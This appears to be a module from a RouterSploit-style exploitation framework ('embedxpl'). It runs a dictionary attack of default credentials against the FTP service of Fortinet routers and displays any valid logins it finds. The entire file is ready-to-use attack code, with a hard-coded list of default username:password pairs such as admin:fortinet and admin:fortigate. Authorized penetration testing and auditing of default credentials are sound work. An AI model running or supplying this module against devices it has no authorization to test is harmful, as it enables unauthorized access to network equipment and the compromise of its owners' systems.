from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.ftp_default import Exploit as FTPDefault


class Exploit(FTPDefault):
    __info__ = {
        "name": "Fortinet Router Default FTP Creds",
        "description": "Module performs dictionary attack against Fortinet Router FTP service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
        ),
        "devices": (
            "Fortinet Router",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(21, "Target FTP port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:,admin:admin,maintainer:admin,admin:fortinet,admin:fortigate,admin:password,admin:123456", "User:Pass or file with default credentials (file://)")
